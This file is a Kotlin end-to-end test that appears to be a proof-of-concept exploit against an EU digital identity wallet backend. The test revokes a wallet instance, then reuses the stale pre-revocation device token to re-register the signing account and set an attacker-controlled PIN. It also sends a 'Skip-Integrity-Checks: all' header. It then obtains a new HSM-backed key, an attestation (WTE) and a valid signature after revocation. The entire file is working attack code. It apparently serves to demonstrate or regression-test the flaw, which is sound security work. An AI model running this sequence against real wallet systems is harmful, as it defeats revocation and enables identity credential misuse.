package de.eudiwallet.backend.poc

import com.authlete.hms.ComponentIdentifier
import com.authlete.hms.ComponentValueProvider
import com.authlete.hms.SignatureBaseBuilder
import com.authlete.hms.SignatureInputField
import com.authlete.hms.SignatureMetadata
import com.fasterxml.jackson.databind.JsonNode
import com.fasterxml.jackson.module.kotlin.jacksonObjectMapper
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.junit.jupiter.api.Assertions.assertNotEquals
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import java.security.KeyFactory
import java.security.KeyPair
import java.security.KeyPairGenerator
import java.security.MessageDigest
import java.security.Signature
import java.security.spec.ECGenParameterSpec
import java.security.spec.X509EncodedKeySpec
import java.time.Instant
import java.util.Base64

class RwscaRevocationResurrectionE2eTest {
    private val baseUrl = System.getenv("POC_BASE_URL") ?: "http://127.0.0.1:8080"
    private val client = OkHttpClient()
    private val mapper = jacksonObjectMapper()
    private val b64 = Base64.getEncoder()

    data class SigSpec(
        val keyPair: KeyPair,
        val name: String,
        val keyId: String,
    )

    @Test
    fun `revoked wallet can resurrect RWSCA and obtain HSM signature with stale MDVM token`() {
        val mdvmKey = newP256()
        val pinKey = newP256()

        println("[1/11] Register MDVM and capture token")
        val mdvmChallenge = challenge("/v1/mdvm/challenge", "mdvm_auth_challenge")
        val mdvmBody = json(
            mapOf(
                "wi_mdvm_auth_pubk" to b64.encodeToString(mdvmKey.public.encoded),
                "wi_device_class" to mapOf(
                    "model" to "PoC",
                    "device" to "poc",
                    "product" to "poc",
                    "hardware" to "poc",
                    "versionPatch" to "2026-09-01",
                    "versionRelease" to "15",
                ),
                "wi_android_key_attestation" to emptyList<String>(),
            ),
        )
        val mdvmRegister = signedJson(
            "POST",
            "/v1/mdvm/android/register",
            mdvmBody,
            linkedMapOf(
                "Auth-Challenge" to mdvmChallenge,
                "Skip-Integrity-Checks" to "all",
            ),
            listOf(SigSpec(mdvmKey, "mdvm-auth-sig", "wi-mdvm-auth-key")),
        )
        val mdvmWiId = mdvmRegister["mdvm_wi_id"].asText()
        val staleMdvmToken = mdvmRegister["mdvm_token"].asText()
        println("MDVM registered: $mdvmWiId")

        println("[2/11] Register WPB and capture revocation code")
        val wpbChallenge = challenge("/v1/wpb/challenge", "wpb_auth_challenge")
        val wpbRegister = signedJson(
            "POST",
            "/v1/wpb/register",
            "",
            linkedMapOf(
                "Auth-Challenge" to wpbChallenge,
                "Mdvm-Token" to staleMdvmToken,
            ),
            listOf(SigSpec(mdvmKey, "wpb-auth-sig", "wi-mdvm-auth-key")),
        )
        val revocationCode = wpbRegister["wpb_wi_revocation_code"].asText()
        println("WPB registered")

        println("[3/11] Register initial RWSCA account")
        val rwscaChallenge1 = challenge("/v1/rwsca/challenge", "rwsca_auth_challenge")
        val rwscaRegister1 = signedJson(
            "POST",
            "/v1/rwsca/register",
            "",
            linkedMapOf(
                "Auth-Challenge" to rwscaChallenge1,
                "Mdvm-Token" to staleMdvmToken,
            ),
            listOf(SigSpec(mdvmKey, "rwsca-auth-sig", "wi-mdvm-auth-key")),
        )
        val oldRwscaId = rwscaRegister1["rwsca_account_id"].asText()
        println("Initial RWSCA account: $oldRwscaId")

        println("[4/11] Delete RWSCA account before revocation")
        val rwscaDeleteChallenge = challenge("/v1/rwsca/challenge", "rwsca_auth_challenge")
        signedNoContent(
            "DELETE",
            "/v1/rwsca/deleteAccount",
            "",
            linkedMapOf(
                "Auth-Challenge" to rwscaDeleteChallenge,
                "Mdvm-Token" to staleMdvmToken,
                "Rwsca-Account-Id" to oldRwscaId,
            ),
            listOf(SigSpec(mdvmKey, "rwsca-auth-sig", "wi-mdvm-auth-key")),
        )

        println("[5/11] Revoke Wallet Instance via WPB")
        val revokeBody = json(mapOf("wpb_wi_revocation_code" to revocationCode))
        val revokeResponse = plainJson("POST", "/v1/wpb/revoke", revokeBody)
        assertTrue(revokeResponse.code == 202 || revokeResponse.code == 200, "WPB revoke failed: ${revokeResponse.code}")

        println("[6/11] Wait until RWSCA Kafka consumer records UNKNOWN_HANDLE")
        waitForRwscaUnknownHandle()

        println("[7/11] Re-register RWSCA using the pre-revocation MDVM token")
        val rwscaChallenge2 = challenge("/v1/rwsca/challenge", "rwsca_auth_challenge")
        val rwscaRegister2 = signedJson(
            "POST",
            "/v1/rwsca/register",
            "",
            linkedMapOf(
                "Auth-Challenge" to rwscaChallenge2,
                "Mdvm-Token" to staleMdvmToken,
            ),
            listOf(SigSpec(mdvmKey, "rwsca-auth-sig", "wi-mdvm-auth-key")),
        )
        val newRwscaId = rwscaRegister2["rwsca_account_id"].asText()
        assertNotEquals(oldRwscaId, newRwscaId)
        println("Resurrected RWSCA account: $newRwscaId")

        println("[8/11] Initialize attacker-controlled new PIN and obtain PIN session")
        val initChallenge = challenge("/v1/rwsca/challenge", "rwsca_auth_challenge")
        val initBody = json(mapOf("wi_rwsca_pin_pubk" to b64.encodeToString(pinKey.public.encoded)))
        val pinSession = signedJson(
            "POST",
            "/v1/rwsca/initializePinAndStartPinSession",
            initBody,
            linkedMapOf(
                "Auth-Challenge" to initChallenge,
                "Mdvm-Token" to staleMdvmToken,
                "Rwsca-Account-Id" to newRwscaId,
            ),
            listOf(
                SigSpec(mdvmKey, "rwsca-auth-sig", "wi-mdvm-auth-key"),
                SigSpec(pinKey, "rwsca-pin-sig", "wi-rwsca-pin-key"),
            ),
        )
        val pinSessionToken = pinSession["rwsca_pin_session_token"].asText()

        println("[9/11] Create a new HSM-backed key and WTE after revocation")
        val createChallenge = challenge("/v1/rwsca/challenge", "rwsca_auth_challenge")
        val createBody = json(
            mapOf(
                "number_of_keys" to 1,
                "pp_c_nonce" to b64.encodeToString(MessageDigest.getInstance("SHA-256").digest("issuer-nonce".toByteArray())),
            ),
        )
        val created = signedJson(
            "POST",
            "/v1/rwsca/createKeys",
            createBody,
            linkedMapOf(
                "Auth-Challenge" to createChallenge,
                "Mdvm-Token" to staleMdvmToken,
                "Rwsca-Account-Id" to newRwscaId,
            ),
            listOf(SigSpec(mdvmKey, "rwsca-auth-sig", "wi-mdvm-auth-key")),
        )
        val key = created["rwsca_wi_keys"][0]
        val returnedPublicKey = key["rwscd_wi_pubk"].asText()
        val wrappedPrivateKey = key["rwsca_wi_wrapped_prvk"].asText()
        val wte = created["rwsca_wte"].asText()
        assertTrue(wte.isNotBlank(), "WTE is empty")

        println("[10/11] Ask RWSCA HSM to sign data after wallet revocation")
        val hash = MessageDigest.getInstance("SHA-256").digest("post-revocation proof".toByteArray())
        val signChallenge = challenge("/v1/rwsca/challenge", "rwsca_auth_challenge")
        val signBody = json(
            mapOf(
                "rwsca_wi_wrapped_prvk" to wrappedPrivateKey,
                "wi_key_binding_data_hash" to b64.encodeToString(hash),
            ),
        )
        val signed = signedJson(
            "POST",
            "/v1/rwsca/signData",
            signBody,
            linkedMapOf(
                "Auth-Challenge" to signChallenge,
                "Mdvm-Token" to staleMdvmToken,
                "Rwsca-Account-Id" to newRwscaId,
                "Rwsca-Pin-Session-Token" to pinSessionToken,
            ),
            listOf(SigSpec(mdvmKey, "rwsca-auth-sig", "wi-mdvm-auth-key")),
        )
        val derSignature = Base64.getDecoder().decode(signed["rwscd_key_binding_signature"].asText())

        println("[11/11] Verify returned ECDSA signature with the new public key")
        val publicKey = KeyFactory.getInstance("EC")
            .generatePublic(X509EncodedKeySpec(Base64.getDecoder().decode(returnedPublicKey)))
        val verifier = Signature.getInstance("NONEwithECDSA")
        verifier.initVerify(publicKey)
        verifier.update(hash)
        assertTrue(verifier.verify(derSignature), "Returned HSM signature did not verify")

        println("CONFIRMED: revoked Wallet Instance resurrected RWSCA with stale MDVM token")
        println("CONFIRMED: new PIN session, HSM-backed key, WTE, and valid post-revocation ECDSA signature obtained")
    }

    private fun newP256(): KeyPair =
        KeyPairGenerator.getInstance("EC").apply {
            initialize(ECGenParameterSpec("secp256r1"))
        }.generateKeyPair()

    private fun json(value: Any): String = mapper.writeValueAsString(value)

    private fun challenge(path: String, field: String): String {
        val req = Request.Builder()
            .url(baseUrl + path)
            .post(ByteArray(0).toRequestBody(null))
            .build()
        client.newCall(req).execute().use { res ->
            val body = res.body?.string().orEmpty()
            check(res.isSuccessful) { "Challenge $path failed: ${res.code} $body" }
            return mapper.readTree(body)[field].asText()
        }
    }

    private data class PlainResponse(val code: Int, val body: String)

    private fun plainJson(method: String, path: String, body: String): PlainResponse {
        val media = "application/json".toMediaType()
        val rb = Request.Builder().url(baseUrl + path)
        if (method == "POST") rb.post(body.toRequestBody(media)) else error("unsupported")
        client.newCall(rb.build()).execute().use { res ->
            return PlainResponse(res.code, res.body?.string().orEmpty())
        }
    }

    private fun signedJson(
        method: String,
        path: String,
        body: String,
        headers: LinkedHashMap<String, String>,
        specs: List<SigSpec>,
    ): JsonNode {
        val response = executeSigned(method, path, body, headers, specs)
        check(response.code in 200..299) { "$method $path failed: ${response.code} ${response.body}" }
        return if (response.body.isBlank()) mapper.createObjectNode() else mapper.readTree(response.body)
    }

    private fun signedNoContent(
        method: String,
        path: String,
        body: String,
        headers: LinkedHashMap<String, String>,
        specs: List<SigSpec>,
    ) {
        val response = executeSigned(method, path, body, headers, specs)
        check(response.code in 200..299) { "$method $path failed: ${response.code} ${response.body}" }
    }

    private fun executeSigned(
        method: String,
        path: String,
        body: String,
        headers: LinkedHashMap<String, String>,
        specs: List<SigSpec>,
    ): PlainResponse {
        val url = baseUrl + path
        val bodyBytes = body.toByteArray()
        val digest = "sha-256=:${b64.encodeToString(MessageDigest.getInstance("SHA-256").digest(bodyBytes))}:"

        val allHeaders = linkedMapOf<String, List<String>>()
        headers.forEach { (k, v) -> allHeaders[k] = listOf(v) }
        allHeaders["Content-Digest"] = listOf(digest)

        val rb = Request.Builder().url(url)
        headers.forEach { (k, v) -> rb.header(k, v) }
        rb.header("Content-Digest", digest)

        val componentNames = mutableListOf("@method", "@path", "content-digest")
        headers.keys.map { it.lowercase() }.forEach { if (it !in componentNames) componentNames += it }

        specs.forEach { spec ->
            val provider = ComponentValueProvider().apply {
                this.method = method
                targetUri = url
                this.headers = allHeaders
            }
            val metadata = SignatureMetadata(componentNames.map(::ComponentIdentifier))
            metadata.parameters
                .setAlg("ecdsa-p256-sha256")
                .setKeyid(spec.keyId)
                .setCreated(Instant.now())

            val base = SignatureBaseBuilder(provider).build(metadata)
            val signatureInput = SignatureInputField(mapOf(spec.name to metadata)).serialize()
            val signer = Signature.getInstance("SHA256withECDSA")
            signer.initSign(spec.keyPair.private)
            signer.update(base.serialize().encodeToByteArray())
            val signature = b64.encodeToString(signer.sign())

            rb.addHeader("Signature-Input", signatureInput)
            rb.addHeader("Signature", "${spec.name}=:$signature:")
        }

        val media = "application/json".toMediaType()
        when (method) {
            "POST" -> rb.post(body.toRequestBody(media))
            "DELETE" -> if (body.isEmpty()) rb.delete() else rb.delete(body.toRequestBody(media))
            else -> error("Unsupported method $method")
        }

        client.newCall(rb.build()).execute().use { res ->
            return PlainResponse(res.code, res.body?.string().orEmpty())
        }
    }

    private fun waitForRwscaUnknownHandle() {
        repeat(80) {
            val process = ProcessBuilder("docker", "compose", "logs", "--no-color", "app-combined")
                .redirectErrorStream(true)
                .start()
            val logs = process.inputStream.bufferedReader().readText()
            process.waitFor()
            if (logs.lineSequence().any { line ->
                    line.contains("UNKNOWN_HANDLE") &&
                        (line.contains("RwscaRevocationListener") || line.contains("RWSCA"))
                }
            ) {
                println("Observed RWSCA UNKNOWN_HANDLE after revocation")
                return
            }
            Thread.sleep(250)
        }
        error("Did not observe RWSCA UNKNOWN_HANDLE in app-combined logs")
    }
}
